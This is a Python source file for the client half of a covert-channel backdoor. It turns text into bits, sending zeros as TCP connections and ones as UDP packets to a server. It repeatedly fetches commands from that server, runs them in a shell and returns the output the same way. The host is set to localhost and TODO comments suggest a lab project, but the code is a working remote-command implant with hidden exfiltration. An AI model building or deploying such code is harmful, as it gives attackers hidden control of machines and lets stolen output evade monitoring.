import socket as Socket
from socket import socket
import time, subprocess

#TODO calculate wait times via ping travel time

WAITTIME = 0.001
PORT = 1234
HOST = "127.0.0.1"

#Socket builder
def build_socket(sockType) -> socket:
    serverSock = Socket.socket(Socket.AF_INET,sockType)
    return serverSock


#Binary conversion of output
def convert_to_binary(toSend:str) -> str:
    bitsOut = ""
    for letter in toSend:
        bitsOut += format(ord(letter),"08b") #str -> ASCII -> Binary
    return bitsOut


#Primary traffic conversion and send
def send_traffic(message:str) -> None:
    print("Sending: "+message)
    udpSock = build_socket(Socket.SOCK_DGRAM)

    binaryToSend = convert_to_binary(message)
    for bit in binaryToSend:
        if int(bit) == 0: #Tcp connect
            tcpSock = build_socket(Socket.SOCK_STREAM)
            tcpSock.connect((HOST,PORT))
            tcpSock.send(b"")
            tcpSock.close()
            time.sleep(WAITTIME)
        else: #Udp connect
            udpSock.sendto(b"",(HOST,PORT))
            time.sleep(WAITTIME)
    time.sleep(0.5) #Ensures order. TODO better WAITTIME calculation
    udpSock.sendto(b"END",(HOST,PORT)) #TODO provide better end method.


#Recieves instructions from server
def recv_traffic() -> str: #TODO improve this for better covert channels
    tcpSock = build_socket(Socket.SOCK_STREAM)
    time.sleep(0.2)
    tcpSock.connect((HOST,PORT))
    output = tcpSock.recv(1024).decode()
    tcpSock.close()
    return output


#Determines client actions
def handle_traffic(instructions:str) ->str:
    if instructions == "SLP": #No pending commands, check back later
        time.sleep(5)
        output = ""
    else: #Command received. Execute and return results
        instructionTokens = instructions.split(" ")
        output = subprocess.run(instructionTokens,capture_output=True,shell=True).stdout.decode()
    return output


def main():
    toSend = "BDE" #Placeholder value. "Begin Data Exchange"

    while True:
        send_traffic(toSend) #Comes first to start exchanges
        message = recv_traffic()
        toSend = handle_traffic(message) #Builds return message to server


main()